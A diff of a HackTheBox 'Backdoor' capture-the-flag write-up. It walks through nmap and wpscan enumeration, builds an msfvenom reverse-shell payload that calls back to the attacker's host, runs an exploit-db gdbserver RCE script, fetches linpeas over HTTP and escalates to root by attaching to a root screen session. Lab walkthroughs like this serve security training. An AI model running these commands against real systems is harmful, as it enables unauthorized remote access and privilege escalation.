@@ -1,4 +1,11 @@
-# nmap scan
+Welcome to the another CTF challenge from HackTheBox. What we can learn from the machine. 
+* Linux enumeration
+* Directory traversal
+* Exploiting unprotected screen session
+
+Let's start with nmap scan.
+
+## Nmap Scan Result
 ```bash
 ┌──(defalt@kali)-[~]
 └─$ nmap -sC -sV -p- -Pn -A 10.10.11.125
@@ -22,7 +29,13 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 48.89 seconds
 ```
-# wpscan
+Looks like poer 22,80,1337(gdb_server) open. Let's see what we got on website.
+
+![](web.png)
+
+We can see webpage make by wordpress. So let's run wpscan and check what we can get.
+## WPscan Results
+I found below information those kinda imporatant to us.
 ```bash
 [+] WordPress version 5.8.1 identified (Insecure, released on 2021-09-09).
  | Found By: Rss Generator (Passive Detection)
@@ -55,79 +68,29 @@ Nmap done: 1 IP address (1 host up) scanned in 48.89 seconds
  |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
  |  Login Error Messages (Aggressive Detection)
 ```
-# msf
-```bash
-┌──(defalt@kali)-[~]
-└─$ msfconsole                           
-                                                  
+My self try to exploit wordpress and got a **wp-config.php** and **/etc/passwd/** files. But nothing juicy happen.
 
- ______________________________________________________________________________
-|                                                                              |
-|                          3Kom SuperHack II Logon                             |
-|______________________________________________________________________________|
-|                                                                              |
-|                                                                              |
-|                                                                              |
-|                 User Name:          [   security    ]                        |
-|                                                                              |
-|                 Password:           [               ]                        |
-|                                                                              |
-|                                                                              |
-|                                                                              |
-|                                   [ OK ]                                     |
-|______________________________________________________________________________|
-|                                                                              |
-|                                                       https://metasploit.com |
-|______________________________________________________________________________|
+## Reverse shell with Metasploit to Access gdb_server
 
+### What is GDB ?
+* GDB stands for GNU Project Debugger and is a debugging tool which helps you poke around inside your
+programs while they are executing and also allows you to see what exactly happens when your program
+crashes.
 
-       =[ metasploit v6.1.37-dev                          ]
-+ -- --=[ 2212 exploits - 1171 auxiliary - 396 post       ]
-+ -- --=[ 615 payloads - 45 encoders - 11 nops            ]
-+ -- --=[ 9 evasion                                       ]
+### What is gdbserver ?
+* gdbserver is a program that allows you to run GDB on a different machine than the one that is running the
+program being debugged.
 
-Metasploit tip: Use the resource command to run 
-commands from a file
+### RCE on gdbserver
 
-msf6 > use exploit/multi/gdb/gdb_server_exec
-[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
-msf6 exploit(multi/gdb/gdb_server_exec) > show options
+* Googling for any exploits available for gdbserver we find this Remote Code Execution vulnerability in
+gdbserver version 9.2. We are uncertain about the version of gdbserver running on the server, but let’s
+just give this exploit a try.
 
-Module options (exploit/multi/gdb/gdb_server_exec):
+Link to exploit : https://www.exploit-db.com/exploits/50539
 
-   Name      Current Setting  Required  Description
-   ----      ---------------  --------  -----------
-   EXE_FILE  /bin/true        no        The exe to spawn when gdbserver is not attached to a
-                                         process.
-   RHOSTS                     yes       The target host(s), see https://github.com/rapid7/me
-                                        tasploit-framework/wiki/Using-Metasploit
-   RPORT                      yes       The target port (TCP)
-
-
-Payload options (linux/x86/meterpreter/reverse_tcp):
-
-   Name   Current Setting  Required  Description
-   ----   ---------------  --------  -----------
-   LHOST  192.168.123.128  yes       The listen address (an interface may be specified)
-   LPORT  4444             yes       The listen port
-
-
-Exploit target:
-
-   Id  Name
-   --  ----
-   0   x86 (32-bit)
-
-
-msf6 exploit(multi/gdb/gdb_server_exec) > set rhosts 10.10.11.125
-rhosts => 10.10.11.125
-msf6 exploit(multi/gdb/gdb_server_exec) > set rport 1337
-rport => 1337
-msf6 exploit(multi/gdb/gdb_server_exec) > set lhost 10.10.14.2
-lhost => 10.10.14.2
-msf6 exploit(multi/gdb/gdb_server_exec) > set lport 4444
-```
-# exploit - https://www.exploit-db.com/exploits/50539
+## Exploit in action
+First you need to create a reverse shell using **msfvenom**. 
 ```bash
 ┌──(defalt@kali)-[~/Documents/htb/backdoor]
 └─$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.2 LPORT=4444 PrependFork=true -o rev.bin
@@ -136,7 +99,10 @@ msf6 exploit(multi/gdb/gdb_server_exec) > set lport 4444
 No encoder specified, outputting raw payload
 Payload size: 106 bytes
 Saved as: rev.bin
-                                                                                                        
+```                                                             
+It saved as rev.bin. You can use whatever name if you like. Let's exploit this badboy!! First make netcat listener for port 4444.
+
+```
 ┌──(defalt@kali)-[~/Documents/htb/backdoor]
 └─$ python3 exploit.py 10.10.11.125:1337 rev.bin
 [+] Connected to target. Preparing exploit
@@ -154,7 +120,8 @@ ls
 user.txt
 ```
 
-# root
+## Getting root aceess
+Let's run linpeas in our victim's machine.
 ```bash
 ┌──(defalt@kali)-[~/Documents/htb]
 └─$ python -m http.server                                                                           2 ⨯
@@ -179,8 +146,20 @@ chmod +x linpeas.sh
 user@Backdoor:/home/user$ bash linpeas.sh
 bash linpeas.sh
 ```
+![](suid.png)
 
-# suid
+Looks like user have a suid permission to screen. Let's search this about gtfobins.
+
+https://gtfobins.github.io/gtfobins/screen/
+
+Again googling for privilege escalation through the screen we have an exploit available for GNU Screen 4.5.0 and our’s is 4.08 so it’s of no use. So, I tried to learn about screen command and the ‘-x’ option is very useful here. Basically, with ‘-x’ option, we can get attached to a session that is already attached elsewhere. Now in this case a session is already running as root so, we can get attached to that session for getting root access.
+
+First, we have to set the terminal emulator to Linux by using export TERM=xterm. You can check your TERM setting by running echo $TERM. Now just run the screen command as shown.
+
+
+https://serverfault.com/questions/720357/ubuntu-allow-users-access-to-roots-screen-command-also-restrict-which-screens
+
+## Pwned !!
 ```bash
 user@Backdoor:/home/user$ /usr/bin/screen -x root/root
 /usr/bin/screen -x root/root
@@ -197,4 +176,5 @@ wc root.txt
 root@Backdoor:~# 
 ```
 
-https://serverfault.com/questions/720357/ubuntu-allow-users-access-to-roots-screen-command-also-restrict-which-screens
+Thx For Reading,
+Have a Nice day!!
